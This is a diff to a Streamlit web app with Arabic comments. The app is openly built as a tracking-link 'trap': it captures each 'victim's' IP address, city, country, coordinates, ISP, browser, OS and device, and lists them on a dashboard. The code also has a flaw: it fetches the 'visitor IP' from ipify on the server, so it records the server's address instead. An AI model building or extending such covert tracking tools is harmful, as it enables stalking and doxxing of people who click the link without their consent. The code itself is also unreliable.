@@ -51,27 +51,37 @@ def capture_victim_data():
     """التقاط بيانات الضحية عند فتح رابط التتبع"""
     query_params = st.query_params
     
-    if 'target' in query_params:
+    if 'target' in query_params and not st.session_state.get('victim_captured', False):
         try:
             # الحصول على عنوان IP الحقيقي للزائر
-            ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
-            if ip_response.status_code == 200:
-                user_ip = ip_response.json().get('ip', 'Unknown')
-            else:
-                user_ip = 'Unknown'
+            user_ip = 'Unknown'
+            try:
+                ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
+                if ip_response.status_code == 200:
+                    user_ip = ip_response.json().get('ip', 'Unknown')
+            except:
+                pass
             
-            # الحصول على معلومات المتصفح والجهاز
-            user_agent = st.session_state.get('user_agent', 'Unknown')
+            # الحصول على معلومات المتصفح والجهاز من Streamlit
+            user_agent = 'Unknown'
+            try:
+                if hasattr(st, 'browser'):
+                    browser_info = st.browser
+                    if hasattr(browser_info, 'user_agent'):
+                        user_agent = browser_info.user_agent
+            except:
+                pass
             
             # الحصول على معلومات الموقع الجغرافي
+            geo_data = None
             try:
-                geo_response = requests.get(f'https://ip-api.com/json/{user_ip}?lang=ar', timeout=5)
+                geo_response = requests.get(f'https://ip-api.com/json/{user_ip}?lang=ar&fields=country,city,lat,lon,isp,org,status', timeout=5)
                 if geo_response.status_code == 200:
-                    geo_data = geo_response.json()
-                else:
-                    geo_data = None
+                    response_data = geo_response.json()
+                    if response_data.get('status') == 'success':
+                        geo_data = response_data
             except:
-                geo_data = None
+                pass
             
             # تسجيل بيانات الضحية
             victim_logger.log_victim_data(
@@ -81,7 +91,7 @@ def capture_victim_data():
                 geo_data=geo_data
             )
             
-            # إعادة توجيه أو عرض صورة وهمية
+            # وضع علامة على أن البيانات تم التقاطها
             st.session_state['victim_captured'] = True
             
         except Exception as e:
@@ -415,14 +425,18 @@ with tabs[5]:
         if victims:
             import pandas as pd
             
-            # تحويل البيانات لجدول
+            # تحويل البيانات لجدول محسّن
             victims_display = []
             for victim in victims:
                 victims_display.append({
                     "⏰ الوقت": victim.get('timestamp', 'Unknown'),
-                    "🌐 عنوان IP": victim.get('ip_address', 'Unknown'),
-                    "🗺️ الدولة": victim.get('geo_data', {}).get('country', 'Unknown') if victim.get('geo_data') else 'Unknown',
-                    "🏙️ المدينة": victim.get('geo_data', {}).get('city', 'Unknown') if victim.get('geo_data') else 'Unknown',
+                    "🌐 IP": victim.get('ip_address', 'Unknown'),
+                    "🌍 الدولة": victim.get('country', 'Unknown'),
+                    "🏙️ المدينة": victim.get('city', 'Unknown'),
+                    "🔗 المتصفح": victim.get('browser', 'Unknown'),
+                    "💻 نظام التشغيل": victim.get('os', 'Unknown'),
+                    "📱 نوع الجهاز": victim.get('device_type', 'Unknown'),
+                    "🏢 مزود الخدمة": victim.get('isp', 'Unknown'),
                     "🎯 المصيدة": victim.get('referrer', 'Unknown')
                 })
             
